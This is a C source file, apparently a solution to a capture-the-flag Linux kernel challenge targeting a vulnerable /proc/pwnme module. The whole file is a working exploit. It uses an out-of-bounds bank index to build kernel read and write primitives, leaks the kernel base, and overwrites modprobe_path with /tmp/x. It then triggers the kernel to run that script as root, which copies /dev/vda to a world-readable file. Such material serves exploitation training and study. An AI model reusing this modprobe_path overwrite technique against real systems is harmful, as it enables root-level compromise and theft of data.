#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <mqueue.h>
#include <linux/io_uring.h>
#include <linux/keyctl.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <linux/netlink.h>
#include <arpa/inet.h>

#define TOTAL_BANKS 16


struct fatptr {
	void *data;
	size_t size;
};

struct args_create { size_t size; };
struct args_switch { long index;  };

int devfd;

#define DUMPSIZE 1024

// add a struct fatptr entry to banks table
static int addblock(int size)
{
struct args_create ac;

		ac.size = size;
		return (ioctl(devfd, 0x40087000, &ac));
}

static int changeindex(int index)
{
struct args_switch as;

	as.index = index;
	return (ioctl(devfd, 0x40087001, &as));
}


void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

unsigned long long modprobe_path = 0;
unsigned oobindex = 0;

void read_primitive(char *dst, char *src, int length)
{
char tmp[16];

	changeindex(oobindex);
	*(uint64_t *)tmp = src;
	*(uint64_t *)(tmp+8) = length;
	write(devfd,tmp,16);
	changeindex(TOTAL_BANKS);
	read(devfd, dst, length);
}

void write_primitive(char *dst, char *src, int length)
{
char tmp[16];

	changeindex(oobindex);
	*(uint64_t *)tmp = dst;
	*(uint64_t *)(tmp+8) = length;
	write(devfd,tmp,16);
	changeindex(TOTAL_BANKS);
	write(devfd, src, length);
}


int main(int argc, char *argv[])
{
int i;
int ret;
unsigned char buff[DUMPSIZE];
unsigned char buff2[DUMPSIZE];
unsigned char temp[16];
uint64_t leak1, kbase, kbase2, modprobe_path, gs;

	gs = 0;
	if (argc>1)
	{
		gs = strtoull(argv[1],NULL,16);
		printf("gs = 0x%llx\n", gs);
	}
	else
	{
		printf("give me gs register value as argument please...\n");
		exit(1337);
	}
	// open device
	devfd = open("/proc/pwnme", O_RDWR);
	if (devfd < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	// one block is already allocated by poc
	for (i=1; i<2; i++)
		addblock(TOTAL_BANKS * 16);
	// use index 2 oob to 
	changeindex(2);
	// read oob data leak
	read(devfd,buff,32);
    leak1 = *(uint64_t *)(buff+8);
    printf("leak heap = 0x%llx\n", leak1);

	for (i=2; i<TOTAL_BANKS; i++)
	{
		addblock(TOTAL_BANKS * 16);
	}

	memset(buff2,0,DUMPSIZE);		// clear buff2 first
	for (i=0; i<TOTAL_BANKS; i++)
	{
		*(uint64_t *)buff = leak1;
		*(uint64_t *)(buff+8) = 0xdeadbeef;
		changeindex(i);
		// try to write oob chunk
		write(devfd,buff,16);
		// change index to oob chunk
		changeindex(TOTAL_BANKS);
		memset(temp,0,16);		// clear temp[]
		read(devfd,temp,16);
		if (memcmp(temp, buff2, 16) != 0)
		{
			oobindex = i;
			printf("Index pointing to OOB found --> %d\n", i);
			break;
		}
		// clear uneeded
		write(devfd,buff,16);;
	}
	if (i==TOTAL_BANKS)
	{
		puts("Index pointing to OOB not found.");
		exit(0);
	}
	read_primitive(buff,gs+0x202d8, 8);

	kbase = *(uint64_t *)buff;
	kbase -= 0x201b580;
	modprobe_path = kbase + 0x208b980;
	printf("Kbase = 0x%llx\n", kbase);
	printf("modprobe_path = 0x%llx\n", modprobe_path);
	
	memset(buff,0,16);
	strcpy(buff,"/tmp/x");
	write_primitive(modprobe_path, buff, 7);

	get_flag();
    close(devfd);

    return 0;
}

